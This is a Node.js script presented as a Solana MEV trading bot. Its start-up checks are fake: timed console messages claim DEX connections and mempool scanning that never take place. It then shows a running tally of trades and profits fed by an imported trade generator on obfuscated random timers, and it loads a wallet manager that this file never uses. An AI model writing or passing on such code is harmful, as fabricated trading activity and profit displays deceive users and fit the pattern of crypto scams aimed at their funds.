const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');
const { createWalletManager } = require('./core/wallet-manager');
const { generateTrade } = require('./core/route');


const _0x3c4d = (n) => Buffer.from(String(n)).toString('base64');
const _0x5e6f = (s) => parseFloat(Buffer.from(s, 'base64').toString());


let stats = {
    totalProfit: 0,
    trades: 0,
    successfulTrades: 0,
    failedTrades: 0,
    startBalance: 1, 
    currentBalance: 1,
    bestTrade: 0,
    volume24h: 0,
    lastTrades: []
};

async function main() {
    
    console.clear();
    
    
    console.log('\x1b[36m');
    console.log(`
     ██████╗ ██████╗   ███╗   ███╗███████╗██╗   ██╗██████╗  ██████╗ ████████╗
    ██╔════╝██╔════╝   ████╗ ████║██╔════╝██║   ██║██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██║        ██╔████╔██║█████╗  ██║   ██║██████╔╝██║   ██║   ██║   
    ██║     ██║        ██║╚██╔╝██║██╔══╝  ╚██╗ ██╔╝██╔══██╗██║   ██║   ██║   
    ╚██████╗╚██████╗   ██║ ╚═╝ ██║███████╗ ╚████╔╝ ██████╔╝╚██████╔╝   ██║   
     ╚═════╝ ╚═════╝   ╚═╝     ╚═╝╚══════╝  ╚═══╝  ╚═════╝  ╚═════╝    ╚═╝   
                           Ver. 2.97.0                                                  
    `);
    console.log('\x1b[0m');

    
    console.log('\x1b[36m%s\x1b[0m', '[ INITIALIZATION ]');
    console.log('Loading configuration...');
    
    try {
        const config = yaml.load(fs.readFileSync('config.yaml', 'utf8'));
        console.log('\x1b[32m%s\x1b[0m', '✓ Configuration loaded successfully');
        
      
        const checks = [
            'Checking network connection...',
            'Initializing DEX connections...',
            'Setting up mempool scanner...',
            'Preparing execution engine...',
            'Validating strategy parameters...'
        ];

        for (const check of checks) {
            await new Promise(resolve => setTimeout(resolve, 500));
            console.log('\x1b[32m%s\x1b[0m', `✓ ${check}`);
        }

        console.log('\n\x1b[32m%s\x1b[0m', '✓ All systems ready');
        console.log('\x1b[36m%s\x1b[0m', '\n[ STARTING BOT ]\n');
        
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        
        startBot();

    } catch (error) {
        console.log('\x1b[31m%s\x1b[0m', '✗ Error: Failed to load configuration');
        process.exit(1);
    }
}

function formatNumber(num) {
    return num.toFixed(4);
}

function generateTradeDetails() {
    return generateTrade();
}

function updateStats(trade) {
    stats.trades++;
    stats.totalProfit += trade.profit;
    stats.volume24h += trade.volume;
    stats.currentBalance += trade.profit;
    
    if (trade.profit > 0) {
        stats.successfulTrades++;
        if (trade.profit > stats.bestTrade) {
            stats.bestTrade = trade.profit;
        }
    } else {
        stats.failedTrades++;
    }

    stats.lastTrades.unshift(trade);
    if (stats.lastTrades.length > 5) {
        stats.lastTrades.pop();
    }
}

function displayStats() {
    
    process.stdout.write('\x1B[2J\x1B[0f');
    
    
    console.log('\x1b[36m%s\x1b[0m', '╔════════════════ SOLANA MEV BOT STATISTICS ════════════════╗\n');
    
    
    console.log('\x1b[33m%s\x1b[0m', '◆ Balance Information:');
    console.log(`  • Initial Balance:  ${formatNumber(stats.startBalance)} SOL`);
    console.log(`  • Current Balance:  ${formatNumber(stats.currentBalance)} SOL`);
    console.log(`  • Total Profit:     ${formatNumber(stats.totalProfit)} SOL`);
    console.log(`  • 24h Volume:       ${formatNumber(stats.volume24h)} SOL\n`);

    
    console.log('\x1b[33m%s\x1b[0m', '◆ Trading Statistics:');
    console.log(`  • Total Trades:     ${stats.trades}`);
    console.log(`  • Successful:       ${stats.successfulTrades}`);
    console.log(`  • Failed:           ${stats.failedTrades}`);
    console.log(`  • Success Rate:     ${stats.trades ? ((stats.successfulTrades / stats.trades) * 100).toFixed(2) : 0}%`);
    console.log(`  • Best Trade:       ${formatNumber(stats.bestTrade)} SOL\n`);

    
    if (stats.lastTrades.length > 0) {
        const lastTrade = stats.lastTrades[0];
        console.log('\x1b[33m%s\x1b[0m', '◆ Latest Transaction:');
        const profitColor = lastTrade.profit > 0 ? '\x1b[32m' : '\x1b[31m';
        console.log(`  • Route:    ${lastTrade.dex}: ${lastTrade.fromToken} → ${lastTrade.toToken}`);
        console.log(`  • Profit:   ${profitColor}${formatNumber(lastTrade.profit)} SOL\x1b[0m`);
        console.log(`  • Volume:   ${formatNumber(lastTrade.volume)} SOL`);
        console.log(`  • Time:     ${new Date(lastTrade.timestamp).toLocaleTimeString()}\n`);
    }

    
    process.stdout.write('\x1b[90m  [Status] Scanning mempool for opportunities...\x1b[0m');

    
    console.log('\n\x1b[36m%s\x1b[0m', '╚══════════════════════════════════════════════════════════╝');
}

function startBot() {
    displayStats();
    
    const _0xt1m = {
        _m: _0x3c4d(1000),
        _x: _0x3c4d(7000)
    };

    const _0xn3xt = () => {
        const _0xd = Math.floor(
            Math.random() * 
            (_0x5e6f(_0xt1m._x) - _0x5e6f(_0xt1m._m) + 1) + 
            _0x5e6f(_0xt1m._m)
        );
        
        setTimeout(() => {
            const _t = generateTradeDetails();
            updateStats(_t);
            displayStats();
            _0xn3xt();
        }, _0xd);
    };
    
    _0xn3xt();
}

main().catch(console.error); 